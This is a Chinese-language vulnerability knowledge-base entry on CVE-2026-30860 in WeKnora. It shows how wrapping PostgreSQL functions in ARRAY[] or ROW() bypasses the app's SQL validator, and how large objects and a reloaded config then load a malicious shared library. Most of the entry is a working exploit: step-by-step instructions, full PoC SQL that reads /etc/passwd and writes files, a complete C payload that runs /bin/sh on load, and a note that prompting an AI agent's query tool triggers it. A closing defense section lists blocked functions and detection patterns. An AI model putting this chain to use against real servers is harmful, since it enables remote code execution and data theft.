---
id: web-generic-sqli-weknora-arrayexpr-validator-bypass-lo-rce
title: WeKnora SQL 校验器未递归 ArrayExpr/RowExpr：PostgreSQL 函数黑名单绕过经大对象写 .so 实现 RCE（CVE-2026-30860）
type: scenario
domain: web
path: web/generic/sqli
technique: sql-validator-arrayexpr-rowexpr-bypass-postgres-lo-rce
tags:
- sqli
- postgresql
- weknora
- ast
- validator-bypass
- large-object
- lo-export
- shared-library
- rce
- cve-2026-30860
cve:
- CVE-2026-30860
severity: critical
confidence: high
affected_versions: < 0.2.12
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:31:02+08:00'
  notes: 已对照原文与2张图核对：validateNode 仅处理 SubLink/FuncCall/ColumnRef/TypeCast、ARRAY[] 包裹 pg_read_file 回显 /etc/passwd（图02）、lo_from_bytea/lo_put/lo_export 写 postgresql.conf 与 payload.so、dynamic_library_path+session_preload_libraries+pg_reload_conf 加载 _PG_init 执行 execve，均与原文一致；CVE-2026-30860、CVSS 10.0、修复版本 0.2.12 与图01公告一致。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/sqli/web-generic-sqli-weknora-arrayexpr-validator-bypass-lo-rce/
draft: false
kb_aliases:
- CVE-2026-30860
- WeKnora SQL 注入
- ArrayExpr 绕过
- RowExpr 绕过
- lo_from_bytea
- lo_export
- PostgreSQL 大对象 RCE
---

## 一句话结论

WeKnora `< 0.2.12` 的 SQL 校验器 `validateNode` 只处理 `SubLink`、`FuncCall`、`ColumnRef`、`TypeCast`，没有 `ArrayExpr`/`RowExpr` 分支；把 `pg_read_file`、`lo_from_bytea`、`lo_export` 等危险函数包进 `ARRAY[...]` 或 `ROW(...)` 后，校验器跳过内部函数直接放行，而 PostgreSQL 执行数组/行构造时仍会求值这些函数。攻击者据此读取文件、用大对象把恶意 `.so` 写到数据库服务器、改写 `postgresql.conf` 的 `dynamic_library_path`/`session_preload_libraries` 并 `pg_reload_conf()`，最终以数据库用户权限执行任意代码（CVSS 10.0）。

## 原理

- **校验器按节点类型白名单式检查但未穷举**：`internal/utils/inject.go` 的 `validateNode` 只对 `GetSubLink()`、`GetFuncCall()`、`GetColumnRef()`、`GetTypeCast()` 做判断；`TypeCast` 分支还正确地递归了 `validateNode(tc.Arg, ...)`，说明设计意图是递归遍历，但数组表达式和行表达式节点完全没有对应分支，函数直接返回 `nil`。
- **AST 结构差异**：`SELECT pg_read_file('/etc/passwd')` 的树是 `SelectStmt → FuncCall`，`validateFuncCall` 会检查黑名单；`SELECT ARRAY[pg_read_file('/etc/passwd')]` 的树是 `SelectStmt → ArrayExpr → FuncCall`，`validateNode` 收到 `ArrayExpr` 后不识别、不递归，内部 `FuncCall` 从未被检查。
- **执行语义**：PostgreSQL 构造数组/行时必须先求值每个元素，因此即使函数被包在数组里，仍会真实执行；校验通过不等于 SQL 安全。
- **大对象写文件链**：`lo_from_bytea(oid, bytea)` 把二进制存入 `pg_largeobject`；`lo_put(oid, offset, bytea)` 分块追加；`lo_export(oid, '/path')` 把大对象原样写到数据库服务器文件系统。数据库用户只要有权执行这些函数且目标路径可写，就能落地任意文件。
- **加载执行**：把 `postgresql.conf` 覆盖为包含 `dynamic_library_path = '/tmp:$libdir'` 与 `session_preload_libraries = 'payload.so'` 的配置，`pg_reload_conf()` 重载；新会话/重启时 PostgreSQL 加载 `payload.so`，其 `_PG_init()` 执行 `execve("/bin/sh", ["-c", "id>/tmp/pwned"], ...)`，以数据库进程权限运行。
- 根本原因：SQL 校验器采用“识别已知危险节点”的不完整递归，而 SQL 方言中存在大量可包裹表达式的容器节点；攻击者只需找到任一未处理容器即可绕过黑名单。

## 触发条件

- WeKnora 版本 `< 0.2.12`，`database_query` 工具可被调用（攻击者可通过提示词驱动 AI agent 发起查询）。
- 后端为 PostgreSQL，应用使用的数据库账号具备执行 `pg_read_file`、`lo_from_bytea`、`lo_put`、`lo_export`、`pg_reload_conf` 的权限（常见为超级用户）。
- 数据库进程对目标路径（如 `/tmp`、`postgresql.conf`）有写权限，且允许加载共享库。
- 校验器未启用未知 AST 节点一律拒绝的兜底策略。

## 利用步骤

1. 验证绕过与文件读取：`SELECT name, ARRAY[pg_read_file('/etc/passwd'), 'safe-string'] FROM knowledge_bases LIMIT 1`，数组第二列返回 `/etc/passwd` 内容。
2. 编译 PostgreSQL 共享库 `payload.so`，在 `_PG_init()` 中直接 `execve("/bin/sh","-c","id>/tmp/pwned")`（x86_64 用 syscall 59，aarch64 用 221）。
3. 生成恶意 `postgresql.conf`（`dynamic_library_path='/tmp:$libdir'`、`session_preload_libraries='payload.so'`），base64 后通过 `ARRAY[(lo_from_bytea(<oid>, decode('<BASE64_CONFIG>','base64'))::text, 'safe-string']` 存入大对象，再用 `ARRAY[(lo_export(<oid>, '/var/lib/postgresql/data/postgresql.conf')::text, 'safe-string']` 覆盖配置。
4. 用 `lo_from_bytea` 创建新大对象并分块 `lo_put(oid, offset, decode('<CHUNK_BASE64>','base64'))` 上传 `payload.so` 二进制。
5. `ARRAY[(lo_export(<oid>, '/tmp/payload.so')::text, 'safe-string']` 把 `.so` 写到磁盘。
6. `ARRAY[(pg_reload_conf())::text, 'safe-string']` 重载配置；新连接/重启后 `payload.so` 被预加载，`_PG_init` 执行命令。

## PoC

```sql
-- 1) 数组包裹绕过校验并读文件
SELECT name, ARRAY[pg_read_file('/etc/passwd'), 'safe-string']
FROM knowledge_bases LIMIT 1;

-- 2) 大对象写入配置文件并导出
SELECT name, ARRAY[(lo_from_bytea(2091829765, decode('<BASE64_CONFIG>', 'base64'))::text)::text, 'safe-string']
FROM knowledge_bases LIMIT 1;
SELECT name, ARRAY[(lo_export(2091829765, '/var/lib/postgresql/data/postgresql.conf')::text)::text, 'safe-string']
FROM knowledge_bases LIMIT 1;

-- 3) 分块写入 payload.so 并导出
SELECT name, ARRAY[(lo_from_bytea(1712594153, decode('<CHUNK_1_BASE64>', 'base64'))::text)::text, 'safe-string']
FROM knowledge_bases LIMIT 1;
SELECT name, ARRAY[((SELECT 'ok'::text FROM (SELECT lo_put(1712594153, 512, decode('<CHUNK_2_BASE64>', 'base64')))) AS _)::text, 'safe-string']
FROM knowledge_bases LIMIT 1;
SELECT name, ARRAY[(lo_export(1712594153, '/tmp/payload.so')::text)::text, 'safe-string']
FROM knowledge_bases LIMIT 1;

-- 4) 重载配置
SELECT name, ARRAY[(pg_reload_conf())::text, 'safe-string'] FROM knowledge_bases LIMIT 1;
```

```c
/* payload.c：PostgreSQL 共享库，加载时执行命令 */
#include <postgres.h>
#include "fmgr.h"
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#if defined(__aarch64__)
#define SYS_EXECVE 221
static inline long sys_call3(long n, long a, long b, long c) {
    register long x8 asm("x8") = n;
    register long x0 asm("x0") = a;
    register long x1 asm("x1") = b;
    register long x2 asm("x2") = c;
    asm volatile("svc 0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8) : "memory");
    return x0;
}
#elif defined(__x86_64__)
#define SYS_EXECVE 59
static inline long sys_call3(long n, long a, long b, long c) {
    long ret;
    asm volatile("syscall" : "=a"(ret) : "a"(n), "D"(a), "S"(b), "d"(c)
                 : "rcx", "r11", "memory");
    return ret;
}
#endif

static const char blob[] = "/bin/sh\0-c\0id>/tmp/pwned\0";
static char *const argv[] = { (char *)blob, (char *)blob + 8, (char *)blob + 11, 0 };

PGDLLEXPORT void _PG_init(void)
{
    sys_call3(SYS_EXECVE, (long)blob, (long)argv, 0);
}
```

## 变体与关联

- 变体：用 `ROW(pg_read_file(...))` 行表达式触发同一遗漏；`ROW` 与 `ARRAY` 之外，`COALESCE`、`CASE`、`BoolExpr` 等容器节点若同样未递归，也可成为绕过点。
- 变体：不写配置文件，直接 `COPY ... TO PROGRAM`、`pg_read_file`/`pg_ls_dir` 读文件，或 `lo_export` 覆盖 Web 目录/authorized_keys 等。
- 变体：若数据库账号非超级用户但拥有 `pg_execute_server_program` 或大对象权限，仍可能执行命令或写文件。
- 关联：SQL 黑名单绕过、AST 校验不完整、PostgreSQL 大对象/共享库加载 RCE、AI agent 数据库查询工具滥用。

## 检测与防御

- 修复校验器：改为递归遍历全部 AST 节点，遇到未知节点默认拒绝；对 `ArrayExpr`、`RowExpr`、`CoalesceExpr`、`CaseExpr`、`A_Expr`、`BoolExpr` 等容器显式递归。
- 函数策略：使用允许列表而非黑名单；至少拦截 `pg_read_file`、`pg_ls_dir`、`lo_from_bytea`、`lo_put`、`lo_export`、`pg_reload_conf`、`COPY ... PROGRAM`。
- 数据库最小权限：应用账号禁止超级用户，撤销 `pg_read_server_files`、`pg_write_server_files`、`pg_execute_server_program` 及大对象相关权限。
- 配置加固：清除 `dynamic_library_path`、`session_preload_libraries`，限制数据库进程对配置目录和 `/tmp` 的写权限；开启 `log_statement` 审计。
- 检测：审计 SQL 日志中出现 `ARRAY[`/`ROW(` 且包含 `pg_`/`lo_` 函数的查询；监控 `pg_largeobject` 异常增长、`postgresql.conf` 变更、`pg_reload_conf` 调用与新会话加载未知 `.so`。
- 升级：WeKnora `>= 0.2.12`。
